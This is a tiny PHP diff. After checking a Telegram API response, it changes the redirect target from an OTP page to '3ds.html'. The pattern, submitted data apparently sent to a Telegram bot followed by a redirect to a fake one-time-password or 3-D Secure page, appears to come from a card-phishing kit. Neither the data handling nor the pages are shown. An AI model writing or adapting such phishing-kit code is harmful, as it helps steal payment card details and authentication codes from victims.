@@ -83,5 +83,5 @@ if (!is_array($result) || ($result['ok'] ?? false) !== true) {
     exit('Telegram returned an invalid response.');
 }
 
-header('Location: otp.html');
+header('Location: 3ds.html');
 exit;
